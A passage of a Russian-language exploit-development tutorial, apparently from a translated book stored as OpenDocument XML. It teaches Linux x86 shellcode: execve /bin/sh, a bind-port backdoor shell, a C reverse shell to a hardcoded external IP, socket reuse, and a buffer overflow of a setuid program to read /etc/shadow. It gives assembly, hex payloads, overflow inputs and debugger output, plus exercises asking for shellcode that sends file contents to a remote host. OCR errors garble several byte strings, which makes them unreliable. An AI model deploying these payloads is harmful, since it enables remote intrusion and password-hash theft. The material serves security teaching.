      <text:p text:style-name="P11"><text:s/>int 0x80 </text:p>
      <text:p text:style-name="P11"><text:s/>callit: </text:p>
      <text:p text:style-name="P11"><text:s/>call doit </text:p>
      <text:p text:style-name="P11"><text:s/>db '/bin/sh' </text:p>
      <text:p text:style-name="P3">Протестируем и распечатаем shell-код: </text:p>
      <text:p text:style-name="P5">[twente@gabriel execve]# s-proc -p execve </text:p>
      <text:p text:style-name="P11">/* Следующий shell-код занимает 34 байта */ </text:p>
      <text:p text:style-name="P11">char shellcode[] = </text:p>
      <text:p text:style-name="P11"><text:s/><text:span text:style-name="T33">"\xeb\xl4\x5b\x31\xc0\x99\x88\x43\x07\x89\x5b\x08\x89\x43\x0c" </text:span></text:p>
      <text:p text:style-name="P20"><text:s/>"\x8d\x4b\x08\xb0\x0b\xcd\x80\xe8\xe7\xff\xff\xff\x2f\x62\x69" </text:p>
      <text:p text:style-name="P20"><text:s/>"\x6e\x2f\x73\x68"; </text:p>
      <text:p text:style-name="P11">Calling code... </text:p>
      <text:p text:style-name="P11">sh-2.04# </text:p>
      <text:p text:style-name="P3">Реализация <text:span text:style-name="T9">execve</text:span> для Linux методом заталкивания аргументов в стек </text:p>
      <text:p text:style-name="P37"><text:s/>BITS 32 </text:p>
      <text:p text:style-name="P11"><text:s/>xor eax,еах </text:p>
      <text:p text:style-name="P11"><text:s/>cdq </text:p>
      <text:p text:style-name="P11"><text:s/>push eax </text:p>
      <text:p text:style-name="P11"><text:s/>push 0x68732f2f </text:p>
      <text:p text:style-name="P11"><text:s/>push 0x6e69622f </text:p>
      <text:p text:style-name="P11"><text:s/>mov ebx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>push eax </text:p>
      <text:p text:style-name="P11"><text:s/>push ebx </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,0x0b </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80 </text:p>
      <text:p text:style-name="P3">Откомпилируем и протестируем shell-код:</text:p>
      <text:p text:style-name="P5">[gabriel@root execve]# s-proc execve </text:p>
      <text:p text:style-name="P5">/* Следующий shell-код занимает 24 байта */ </text:p>
      <text:p text:style-name="P11">char shellcode[] = </text:p>
      <text:p text:style-name="P22"><text:s/><text:span text:style-name="T34">"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89" </text:span></text:p>
      <text:p text:style-name="P23"><text:s/>"\xe3\x50\x53\x89\xel\xb0\xb0\x0b\xcd\x80";</text:p>
      <text:p text:style-name="P5">Calling code... </text:p>
      <text:p text:style-name="P5">sh-2.04# </text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T18">Задачи</text:span>: </text:p>
      <text:p text:style-name="P33">1. Напишите shell-код, который с помощью системного вызова <text:span text:style-name="T9">execve</text:span> запускает команду <text:span text:style-name="T11">/bin/sh -с date.</text:span></text:p>
      <text:p text:style-name="P33">2. Напишите shell-код, который открывает файл (системный вызов <text:span text:style-name="T9">open</text:span>), записывает в него данные (<text:span text:style-name="T9">write</text:span>) и закрывает файл (<text:span text:style-name="T9">close</text:span>). Запишите по крайней мере один символ новой строки и хотя бы один нулевой байт. </text:p>
      <text:p text:style-name="P33">3. Напишите shell-код, который читает данные из файла, открывает сокет для соединения с удаленным хостом и записывает прочитанные данные в этот сокет. </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Shell-код для привязки к порту </text:h>
      <text:p text:style-name="P85">Shell-код для привязки к порту часто применяется для атаки на уязвимую программу, исполняемую на удаленном компьютере. Такой код открывает некий порт и выполняет интерпретатор команд когда приходит запрос ни соединение с этим портом. Иными словами, подобный shell-код реализует черный ход в систему. Посмотрим, как такая возможность может быть реализована на С. </text:p>
      <text:p text:style-name="P88"><text:span text:style-name="T17"><text:s/></text:span>int soc, cli;</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s/></text:span>struct sockaddr_in serv_addr;</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s/></text:span>int main()<text:span text:style-name="T17"> </text:span>{</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>serv_addr.sin_family = 2;</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>serv_addr.sin_addr.s_addr = 0;</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>serv_addr.sin_port = 0xAAAA;</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>soc = socket(2,1,0);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>bind(soc, (struct sockaddr *) &amp;serv_addr, 0x10);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>listen(soc, 1);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>cli = accept(soc,0,0);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>dup2(cli,0);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>dup2(cli,1);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>dup2(cli,2);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s text:c="3"/></text:span>execve("/bin/sh",0,0);</text:p>
      <text:p text:style-name="P82"><text:span text:style-name="T17"><text:s/></text:span>}</text:p>
      <text:p text:style-name="P3">В Linux socket-функции реализуются одним системным вызовом <text:span text:style-name="T9">socketcall</text:span> <text:span text:style-name="T1">(</text:span><text:span text:style-name="T8">№102)</text:span></text:p>
      <text:p text:style-name="P5">int socketcall(int call, unsigned long *args); </text:p>
      <text:p text:style-name="P3">Системному вызову <text:span text:style-name="T9">socketcall</text:span> нужно передать два аргумента. Первый <text:span text:style-name="T20">─ </text:span>это номер нужной функции. В заголовочном файле <text:span text:style-name="T11">net.h</text:span> перечислены все имеющиеся <text:soft-page-break/>функции:</text:p>
      <text:p text:style-name="P11">SYS_SOCKET <text:tab/><text:tab/> 1</text:p>
      <text:p text:style-name="P11">SYS_BIND <text:tab/><text:tab/> 2</text:p>
      <text:p text:style-name="P11">SYS_CONNECT <text:tab/> 3</text:p>
      <text:p text:style-name="P11">SYS_LISTEN <text:tab/><text:tab/> 4</text:p>
      <text:p text:style-name="P11">SYS_ACCEPT <text:tab/><text:tab/> 5</text:p>
      <text:p text:style-name="P11">SYS_GETSOCKNAME <text:tab/> 6</text:p>
      <text:p text:style-name="P11">SYS_GETPEERNAME <text:tab/> 7</text:p>
      <text:p text:style-name="P11">SYS_SOCKETPAIR <text:tab/> 8</text:p>
      <text:p text:style-name="P11">SYS_SEND <text:tab/><text:tab/> 9</text:p>
      <text:p text:style-name="P11">SYS_RECV <text:tab/><text:tab/>10</text:p>
      <text:p text:style-name="P11">SYS_SENDTO <text:tab/><text:tab/>11</text:p>
      <text:p text:style-name="P11">SYS_RECVFROM <text:tab/>12</text:p>
      <text:p text:style-name="P11">SYS_SHUTDOWN <text:tab/>13</text:p>
      <text:p text:style-name="P3">Второй аргумент <text:span text:style-name="T9">socketcall </text:span><text:span text:style-name="T20">─</text:span> это указатель на список аргументов, передаваемых заданной функции.</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"><text:s/>BITS 32 </text:span></text:p>
      <text:p text:style-name="P11"><text:s/>xor eax,eax </text:p>
      <text:p text:style-name="P11"><text:s/>xor ebx,ebx </text:p>
      <text:p text:style-name="P11"><text:s/>cdq </text:p>
      <text:p text:style-name="P11"><text:s/>push eax </text:p>
      <text:p text:style-name="P11"><text:s/>push byte 0xl </text:p>
      <text:p text:style-name="P11"><text:s/>push byte 0x2 </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>inc bl<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; socket</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,102<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; socketcall</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80 </text:p>
      <text:p text:style-name="P11"><text:s/>mov esi,eax <text:tab/><text:tab/>;<text:span text:style-name="T35">сохранить возвращенное значение в</text:span> esi </text:p>
      <text:p text:style-name="P11"><text:s/>push edx </text:p>
      <text:p text:style-name="P11"><text:s/>push dword 0xAAAA02AA </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>push byte 0x10 </text:p>
      <text:p text:style-name="P11"><text:s/>push ecx </text:p>
      <text:p text:style-name="P11"><text:s/>push esi </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>inc bl<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; ebx=2: bind</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,102 </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>;</text:span> <text:span text:style-name="T1">socketcall</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>push edx </text:p>
      <text:p text:style-name="P11"><text:s/>push esi </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>mov bl,0x4 <text:span text:style-name="T1"><text:tab/><text:tab/>; listen</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>mov al,102 </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80 <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; socketcall</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>push edx </text:p>
      <text:p text:style-name="P11"><text:s/>push edx </text:p>
      <text:p text:style-name="P11"><text:s/>push esi </text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp </text:p>
      <text:p text:style-name="P11"><text:s/>inc bl<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; ebx=5: accept</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,102 </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80 <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; socketcall</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>mov ebx,eax </text:p>
      <text:p text:style-name="P11"><text:s/>xor ecx,ecx </text:p>
      <text:p text:style-name="P11"><text:s/>mov cl,3 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">loop</text:span>: </text:p>
      <text:p text:style-name="P11"><text:s/>dec cl </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,63 </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; dup2</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>jnz l<text:span text:style-name="T1">oo</text:span>p </text:p>
      <text:p text:style-name="P11"><text:s/>push edx </text:p>
      <text:p text:style-name="P11"><text:s/><text:span text:style-name="T1">push</text:span> lo<text:span text:style-name="T1">ng</text:span> <text:span text:style-name="T1">0</text:span>x<text:span text:style-name="T1">68732f6e</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>push long 0x69622f<text:span text:style-name="T1">2f</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>mov ebx,esp<text:span text:style-name="T1"><text:tab/><text:tab/>; </text:span><text:span text:style-name="T8">адрес </text:span><text:span text:style-name="T1">"//bin/sh"</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>push edx <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; 0</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>push ebx <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T8">адрес </text:span><text:span text:style-name="T1">"//bin/sh" </text:span></text:p>
      <text:p text:style-name="P11"><text:s/>mov ecx,esp <text:span text:style-name="T1"><text:tab/><text:tab/>; </text:span><text:span text:style-name="T8">адрес</text:span><text:span text:style-name="T1"> argv[]</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>mov al,0x0b </text:p>
      <text:p text:style-name="P11"><text:s/>int 0x80<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>;</text:span> <text:span text:style-name="T1">execve</text:span></text:p>
      <text:p text:style-name="P3">Откомпилируем, распечатаем и протестируем наш shell-код. Для этого понадобятся два терминала. На первом мы займемся компиляцией и запуском shell-кода, а на втором запустим клиента, который установит соединение и получит оболочку. На терминале 1 введем следующие команды: </text:p>
      <text:p text:style-name="P5">[root@gabriel bind]# nasm -о bind bind.<text:span text:style-name="T36">s</text:span> </text:p>
      <text:p text:style-name="P11">[root@gabriel bind]# s-proc bind </text:p>
      <text:p text:style-name="P5">/* Следующий shell-код занимает 98 байтов */ </text:p>
      <text:p text:style-name="P7">char shellcode[] = </text:p>
      <text:p text:style-name="P65"><text:span text:style-name="T1">"\</text:span>х31\хс0\х31\х<text:span text:style-name="T1">db</text:span>\х99\х50\х6а\х01\х6<text:span text:style-name="T1">a</text:span>\х0<text:span text:style-name="T1">2</text:span>\<text:span text:style-name="T1">х89</text:span>\<text:span text:style-name="T1">хe1</text:span>\х<text:span text:style-name="T1">fe</text:span>\х<text:span text:style-name="T1">c3</text:span>\<text:span text:style-name="T1">xb0</text:span>" </text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T1">"</text:span>\x66\xcd\x80\x89\xc6\x52\x68\<text:span text:style-name="T1">xaa</text:span>\x<text:span text:style-name="T1">02</text:span>\x<text:span text:style-name="T1">aa</text:span>\x<text:span text:style-name="T1">aa</text:span>\x<text:span text:style-name="T1">89</text:span>\<text:span text:style-name="T1">xel</text:span>\x<text:span text:style-name="T1">6a</text:span>\xl<text:span text:style-name="T1">0"</text:span> </text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T1">"\x5l\x56\x89\xel\xfe\xc3\xb0\x66\xcd\x80\x52\x56\x89\xe1</text:span>\<text:span text:style-name="T1">xb3</text:span>" </text:p>
      <text:p text:style-name="P66">"\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xel\xfe\хc3\xb0\x66\xcd"</text:p>
      <text:p text:style-name="P64"><text:span text:style-name="T1">"\x8O\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3</text:span>f\<text:span text:style-name="T1">xcd</text:span>\<text:span text:style-name="T1">x80</text:span>\<text:span text:style-name="T1">x75\xf8</text:span>" </text:p>
      <text:p text:style-name="P64">"\x52\x68\x2f\x73\x68\x68\x2f\x2f\x62\x69\x6e\x89\xe3\x52\x53" </text:p>
      <text:p text:style-name="P23">"\x89\xel\xb0\x0b\xcd\x80"; </text:p>
      <text:p text:style-name="P11">Calling code... </text:p>
      <text:p text:style-name="P5">Терминал 2: </text:p>
      <text:p text:style-name="P5">[root@gabriel bind]# netstat -al | grep 43690 </text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">tcp </text:span><text:span text:style-name="T12"><text:s text:c="6"/></text:span><text:span text:style-name="T11">0 </text:span><text:span text:style-name="T12"><text:s text:c="5"/></text:span><text:span text:style-name="T11">0 *:43690 </text:span><text:span text:style-name="T12"><text:s text:c="5"/></text:span><text:span text:style-name="T11">*:* </text:span><text:span text:style-name="T12"><text:s text:c="16"/></text:span><text:span text:style-name="T11">LISTEN</text:span></text:p>
      <text:p text:style-name="P11">[root@gabriel bind]# nc localhost 43690 </text:p>
      <text:p text:style-name="P11">uptime </text:p>
      <text:p text:style-name="P27"><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T16">6:58PM up 27 days, 2:08, 2 users, load average: 1.00, 1.00, 1.00</text:span></text:p>
      <text:p text:style-name="P11"><text:soft-page-break/>exit</text:p>
      <text:p text:style-name="P11">[root@gabriel bind]# </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Shell-код для обратного соединения </text:h>
      <text:p text:style-name="P3">Shell-код для обратного соединения устанавливает соединение между взломанной системой и другой, на которой работает какая-нибудь программа для считывания сетевого трафика, например, <text:span text:style-name="T9">netcat.</text:span> После того как shell-код установит соединение, он запускает интерактивную оболочку. Тот факт, что инициатором соединения выступает взломанная машина, позволяет атаковать сервер, находящийся за межсетевым экраном. Такой вид shell-кода полезен также для атаки на уязвимости, который не поддаются прямой эксплуатации. </text:p>
      <text:p text:style-name="P3">Посмотрим, как такая возможность может быть реализована на С. </text:p>
      <text:p text:style-name="P11"><text:s/>int soc, re; </text:p>
      <text:p text:style-name="P11"><text:s/>struct sockaddr_in serv_addr; </text:p>
      <text:p text:style-name="P11"><text:s/>int main () { </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>serv_addr.sin_family = 2; </text:p>
      <text:p text:style-name="P58"><text:s text:c="3"/>serv_addr.sin_addr.s_addr = 0x210c060a;<text:tab/>/* 33.12.6.10 */ </text:p>
      <text:p text:style-name="P58"><text:s text:c="3"/>serv_addr.sin_port = 0xAAAA; <text:tab/><text:tab/><text:tab/>/* порт 43690 */ </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>soc = socket(2,1,0); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>re = connect(soc,(struct sockaddr *)&amp;serv_addr,0x10); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>dup2(re,0); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>dup2(re,l); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>dup2(re,2); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>execve("/bin/sh",0,0); </text:p>
      <text:p text:style-name="P11"><text:s/>} </text:p>
      <text:p text:style-name="P3">То же, что и привязка к порту, но вместо <text:span text:style-name="T9">bind</text:span>, <text:span text:style-name="T9">listen</text:span> и <text:span text:style-name="T9">accept</text:span> - вызов <text:span text:style-name="T9">connect</text:span> </text:p>
      <text:p text:style-name="P3">Чтобы протестировать shell-код, понадобится <text:s/>приложение, работающее на той машине, с которой он устанавливает соединение. Для этой цели прекрасно подходит программа <text:span text:style-name="T2">netcat</text:span><text:span text:style-name="T1">,</text:span> которая может прослушивать любой TCP- или UDP-порт в ожидании соединения. </text:p>
      <text:p text:style-name="P50"><text:span text:style-name="T1">n</text:span>c -<text:span text:style-name="T1">l -p</text:span> 4<text:span text:style-name="T1">3690</text:span></text:p>
      <text:h text:style-name="P92" text:outline-level="2">Shell-код для повторного использования сокета</text:h>
      <text:p text:style-name="P3">Этот shell-код позволяет повторно использовать уже существующее соединение, что дает возможность сократить размер и повышает шансы на то, что эксплойт выполнит свою задачу.</text:p>
      <text:p text:style-name="P3">Идея проста. Когда вы устанавливаете соединение с уязвимым приложением, оно вызывает функцию <text:span text:style-name="T9">accept.</text:span><text:span text:style-name="T19"> Э</text:span>та функция возвращает дескриптор сокета, через который далее ведется обмен данными. </text:p>
      <text:p text:style-name="P3">Shell-код, повторно использующий соединение, просто обращается к системному вызову <text:span text:style-name="T9">dup2</text:span> чтобы перенаправить <text:span text:style-name="T2">stdin</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T2">stdout</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T8">и </text:span><text:span text:style-name="T9">stderr</text:span> в сокет, после чего запускает оболочку. Только и всего. Но есть одна проблема. Нам необходим дескриптор открытого сокета, возвращаемый системным вызовом <text:span text:style-name="T9">accept</text:span>, но сам-то shell-код его не выполняет, стало быть, придется строить догадки.</text:p>
      <text:p text:style-name="P3">Простые однопоточные сетевые демоны обычно используют какие-то файловые дескрипторы на этапе инициализации, а затем входят в бесконечный цикл по приему и обработке запросов. Как правило, они получают от <text:span text:style-name="T9">accept</text:span> один и тот же дескриптор, так как запросы обрабатываются последовательно. Взгляните на трассу: </text:p>
      <text:p text:style-name="P5">603 remote_format_strin <text:s/>CALL <text:s text:c="3"/>socket(0x2,0x1,0x0) </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>RET<text:tab/> <text:s text:c="3"/>socket 3 </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>CALL <text:s text:c="3"/>bind(0x3,0xbfbffblc,0x10)</text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>RET<text:tab/> <text:s text:c="3"/>bind 0 </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>CALL <text:s text:c="3"/>listen(0x3,0x1) </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>RET <text:s text:c="4"/>listen 0 </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>CALL <text:s text:c="3"/>accept(0x3,0,0) </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>RET <text:s text:c="4"/>accept 4 </text:p>
      <text:p text:style-name="P11">603 remote_format_strin <text:s/>CALL read(0x4,0xbfbff8f0, 0xlf4) </text:p>
      <text:p text:style-name="P3">Эта программа создает сокет и начинает прослушивать его. В строке 7 принимается запрос на соединение, и accept возвращает дескриптор 4. Далее из этого дескриптора читаются данные, посылаемые клиентом. </text:p>
      <text:p text:style-name="P3">Представим себе, что в этот момент можно воспользоваться какой-то уязвимостью и запустить shell-код. Чтобы получить интерактивную оболочку, нам достаточно всего лишь выполнить системные вызовы, дублирующие дескрипторы</text:p>
      <text:p text:style-name="P5"><text:s/>dup2(4,0); </text:p>
      <text:p text:style-name="P11"><text:s/>dup2(4,l); </text:p>
      <text:p text:style-name="P11"><text:s/>dup2(4,2); </text:p>
      <text:p text:style-name="P11"><text:s/>execve("/bin/sh",0,0); </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Повторное использование файловых дескрипторов</text:h>
      <text:p text:style-name="P3">Важно понимать, что раз уж вы сумели выполнить внутри атакованной программы свой shell-код, то можете перехватить все файловые дескрипторы, открытые этой программой. Предположим, что программа, показанная ниже, установлена в Linux с битом setuid и владельцем root, то есть во время работы будет иметь привилегии администратора.</text:p>
      <text:p text:style-name="P37"><text:s/>#include &lt;fcntl.h&gt; </text:p>
      <text:p text:style-name="P11"><text:s/>#include &lt;unistd.h&gt; </text:p>
      <text:p text:style-name="P11"><text:s/>void handle_file(int fd,char *stuff) { </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>char small[256]; </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>strcpy(small,stuff); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>memset(small,0,sizeof(small)); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>read(fd,small,256); </text:p>
      <text:p text:style-name="P11"><text:s/>/* продолжение программы */ </text:p>
      <text:p text:style-name="P11"><text:s/>} </text:p>
      <text:p text:style-name="P11"><text:s/></text:p>
      <text:p text:style-name="P11"><text:s/>int main(int argc,char **argv,char **envp) { </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>int fd; </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>fd = open("/etc/shadow", 0_RDONLY); </text:p>
      <text:p text:style-name="P11"><text:soft-page-break/><text:s text:c="3"/>setuid(getuid()); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>setgid(getgid()); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>handle_file(fd, argv[l]); </text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/>return 0; </text:p>
      <text:p text:style-name="P11"><text:s/>} </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:list xml:id="list6880127974488063352" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P67">Эта программа, предназначенная не для обычных пользователей, нуждается в привилегиях <text:span text:style-name="T11">root</text:span>'a только для открытия файла <text:span text:style-name="T9">/etc/shadow.</text:span> Открыв файл, она немедленно отказывается от слишком обширных привилегий. Но функция <text:span text:style-name="T9">оре</text:span><text:span text:style-name="T2">n</text:span>() возвращает дескриптор файла, из которого можно читать даже после того, как привилегии <text:span text:style-name="T11">root</text:span> потеряны. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P77">А дальше интереснее. В строке <text:span text:style-name="T36">5</text:span> первый аргумент, заданный в командной строке, копируется в буфер размером 256 байтов без проверки выхода за границу массива. Стало быть, мы можем спровоцировать переполнение буфера! А уж тогда не составит труда написать shell-код, который прочитает данные из теневого файла паролей, имея его дескриптор.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P77">Передав программе аргумент длиннее 256 байтов, мы сможем затереть важные данные в стеке, в том числе адрес возврата:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P59">root@g<text:span text:style-name="T1">]</text:span># ./readshadow <text:span text:style-name="T1">'</text:span>perl -e 'print "A"*268; print "BBBB"</text:p>
      <text:p text:style-name="P5">Segmentation fault [core dumped] </text:p>
      <text:p text:style-name="P11">[root@g]# gdb -q -core=core </text:p>
      <text:p text:style-name="P60">Core was generated by '.<text:span text:style-name="T24">/readshadow AAAAAAAAAAAAAAAAAAAAAAAAAAAA</text:span><text:span text:style-name="T25">'</text:span></text:p>
      <text:p text:style-name="P24">Program terminated with signal 11, Segmentation fault. </text:p>
      <text:p text:style-name="P11">#0 0x42424242 in ?? () <text:tab/><text:tab/><text:tab/>// 0x42 = 'B'</text:p>
      <text:p text:style-name="P11">(gdb) info reg eip </text:p>
      <text:p text:style-name="P11">eip <text:tab/><text:tab/><text:tab/>0x42424242 <text:tab/><text:tab/>0x42424242 </text:p>
      <text:p text:style-name="P11">(gdb) </text:p>
      <text:p text:style-name="P3">В следующем примере показано, какие системные вызовы используются в этой программе. Особенно интересен вызов <text:span text:style-name="T9">read</text:span>, поскольку нам бы хотелось прочитать файл <text:span text:style-name="T9">/etc/shadow.</text:span></text:p>
      <text:p text:style-name="P5">[root@g]# strace -о trace.txt ./readshadow aa </text:p>
      <text:p text:style-name="P11">[root@g]# cat trace.txt </text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T11">execve(</text:span><text:span text:style-name="T12">"</text:span><text:span text:style-name="T11">./readshadow",["./readshadow","aa"],[/*23 vars */]) </text:span><text:span text:style-name="T12">=</text:span><text:span text:style-name="T11">0</text:span></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T11">_sysctl(</text:span><text:span text:style-name="T12">{</text:span><text:span text:style-name="T11">{CTL_KERN,KERN_OSRELEASE},2,#.2.16-22",9,NULL,0}) </text:span><text:span text:style-name="T12">=</text:span><text:span text:style-name="T11"> 0</text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T11">brk</text:span><text:span text:style-name="T12">(0)</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:tab/><text:tab/></text:span><text:span text:style-name="T11">= 0x80497fc </text:span></text:p>
      <text:p text:style-name="P32"><text:span text:style-name="T11">old_mmap(NULL,4096,PROT_READ|PROT_WRITE,MAP_PRIVATF|MAP</text:span><text:span text:style-name="T12">_</text:span><text:span text:style-name="T11">ANONYMO</text:span><text:span text:style-name="T12">US</text:span><text:span text:style-name="T11">,</text:span></text:p>
      <text:p text:style-name="P21"><text:tab/><text:tab/><text:tab/>-1,0) = 0x40017000</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">open("/etc/ld.so.preload",O_RDONLY)<text:tab/></text:span><text:span text:style-name="T11">= -1 ENOENT (No such f</text:span><text:span text:style-name="T12">i</text:span><text:span text:style-name="T11">l</text:span><text:span text:style-name="T12">e</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/>or</text:span><text:span text:style-name="T11"> directory)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">open("/etc/ld.so.cache", </text:span><text:span text:style-name="T12">O</text:span><text:span text:style-name="T11">_RDONLY) </text:span><text:span text:style-name="T12"><text:tab/>=</text:span><text:span text:style-name="T11"> 4 </text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">fstat(4,</text:span><text:span text:style-name="T11">0xbffff36c) </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/>=</text:span><text:span text:style-name="T11"> -1 </text:span><text:span text:style-name="T12">ENOSYS</text:span><text:span text:style-name="T11">,(</text:span><text:span text:style-name="T12">Function</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12">not</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">implemented)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">fstat(4,{st_mode=S_IFREG|0644,st_size=15646,...})</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12">=</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12">0</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">old_mmap(NULL,15646,PROT_READ,MAP_PRIVATE</text:span><text:span text:style-name="T11">,4,0) </text:span><text:span text:style-name="T12">=</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12">0x</text:span><text:span text:style-name="T11">4</text:span><text:span text:style-name="T12">0018000</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">close(4</text:span><text:span text:style-name="T11">) </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span><text:span text:style-name="T11"> 0</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">open("/lib/libc.so.6",O_RDONLY)</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:tab/>=</text:span><text:span text:style-name="T11"> 4</text:span></text:p>
